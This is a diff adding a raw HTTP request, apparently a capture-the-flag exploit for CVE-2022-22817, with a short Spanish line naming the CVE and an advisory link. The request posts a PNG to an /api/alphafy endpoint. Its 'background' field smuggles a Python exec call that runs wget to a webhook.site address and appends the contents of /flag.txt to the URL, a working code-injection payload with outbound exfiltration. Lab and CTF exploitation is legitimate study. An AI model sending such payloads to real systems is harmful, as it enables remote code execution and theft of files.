@@ -1,0 +1,22 @@
+POST /api/alphafy HTTP/1.1
+Host: 192.168.86.250:1337
+Cache-Control: max-age=0
+Accept-Language: es-ES,es;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: 838
+
+{
+"image": "iVBORw0KGgoAAAANSUhEUgAAAMgAAACRCAYAAACG2fehAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAGLSURBVHhe7dMxAcAgEMDAb/17hg4dIQrulijIsz4DHL1/gQODQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg0AwCASDQDAIBINAMAgEg8DVzAbbRgUeWBJ1BAAAAABJRU5ErkJggg==",
+"background": [
+"exec(\"import os; os.system('wget https://webhook.site/fc8986c5-4996-4bd8-9829-02a5088026ad/$(cat /flag.txt)')\")",
+212,
+45]
+}
+
+El CVE es: CVE-2022-22817
+https://github.com/advisories/GHSA-8vj2-vxx3-667w
